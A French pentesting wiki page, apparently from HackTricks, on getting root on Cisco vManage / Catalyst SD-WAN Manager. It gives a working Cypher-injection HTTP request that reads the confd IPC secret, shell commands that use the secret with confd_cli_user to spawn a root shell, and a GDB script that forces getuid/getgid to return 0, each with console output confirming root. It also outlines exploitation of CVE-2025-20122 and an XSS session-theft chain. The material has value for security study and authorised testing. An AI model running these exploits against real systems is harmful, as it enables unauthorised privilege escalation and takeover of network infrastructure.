# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## Chemin 1

(Exemple de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Après avoir fouillé un peu dans la [documentation](http://66.218.245.39/doc/html/rn03re18.html) relative à `confd` et aux différents binaires (accessibles avec un compte sur le site Cisco), nous avons découvert que pour authentifier le socket IPC, il utilise un secret situé dans `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Vous vous souvenez de notre instance Neo4j ? Elle s'exécute avec les privilèges de l'utilisateur `vmanage`, ce qui nous permet de récupérer le fichier en utilisant la vulnérabilité précédente :
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Le programme `confd_cli` ne prend pas en charge les arguments en ligne de commande mais appelle `/usr/bin/confd_cli_user` avec des arguments. Nous pouvons donc appeler directement `/usr/bin/confd_cli_user` avec notre propre jeu d'arguments. Cependant il n'est pas lisible avec nos privilèges actuels, il faut donc le récupérer depuis le rootfs et le copier avec scp, lire l'aide, et l'utiliser pour obtenir un shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Chemin 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Le blog¹ de l'équipe synacktiv décrivait une façon élégante d'obtenir un root shell, mais l'inconvénient est qu'il nécessite d'obtenir une copie de `/usr/bin/confd_cli_user` qui n'est lisible que par root. J'ai trouvé une autre façon d'escalate to root sans ce tracas.

Lorsque j'ai désassemblé le binaire `/usr/bin/confd_cli`, j'ai observé ce qui suit :

<details>
<summary>Objdump montrant la collecte des UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Quand j'exécute “ps aux”, j'ai observé ce qui suit (_remarque -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
J'ai émis l'hypothèse que le programme “confd_cli” transmet l'UID et le GID qu'il a récupérés de l'utilisateur connecté à l'application “cmdptywrapper”.

Ma première tentative a été d'exécuter “cmdptywrapper” directement en lui fournissant `-g 0 -u 0`, mais cela a échoué. Il semble qu'un descripteur de fichier (-i 1015) ait été créé en cours de route et je ne peux pas le falsifier.

Comme mentionné dans le blog de synacktiv (dernier exemple), le programme `confd_cli` ne prend pas en charge les arguments en ligne de commande, mais je peux l'influencer avec un debugger et, heureusement, GDB est présent sur le système.

J'ai créé un script GDB où j'oblige les API `getuid` et `getgid` à retourner 0. Étant donné que je dispose déjà du privilège “vmanage” via la deserialization RCE, j'ai la permission de lire directement `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Sortie de la console :

<details>
<summary>Sortie de la console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Chemin 3 (bug de validation d'entrée CLI 2025)

Cisco a renommé vManage en *Catalyst SD-WAN Manager*, mais le CLI sous-jacent tourne toujours sur la même machine. Un advisory 2025 (CVE-2025-20122) décrit une validation d'entrée insuffisante dans le CLI qui permet à **any authenticated local user** d'obtenir root en envoyant une requête forgée au service CLI du manager. Combinez n'importe quel low-priv foothold (p.ex. la Neo4j deserialization depuis Path1, ou un cron/backup user shell) avec ce bug pour monter en root sans copier `confd_cli_user` ni attacher GDB :

1. Depuis votre shell low-priv, localisez le endpoint IPC du CLI (typiquement le listener `cmdptywrapper` montré sur le port 4565 dans Path2).
2. Fabriquez une requête CLI qui forge les champs UID/GID à 0. Le bug de validation n'applique pas l'UID de l'appelant original, donc le wrapper lance un PTY avec backing root.
3. Pipelinez n'importe quelle séquence de commandes (`vshell; id`) via la requête forgée pour obtenir un root shell.

> La surface d'exploitation est locale uniquement ; remote code execution est toujours requis pour obtenir le shell initial, mais une fois dans la machine l'exploitation tient en un seul message IPC plutôt qu'en un patch d'UID via debugger.

## Autres vulnérabilités récentes de vManage/Catalyst SD-WAN Manager à chaîner

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript dans des champs d'interface spécifiques ; voler une admin session vous donne un chemin piloté par navigateur vers `vshell` → local shell → Chemin 3 pour obtenir root.

## Références

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
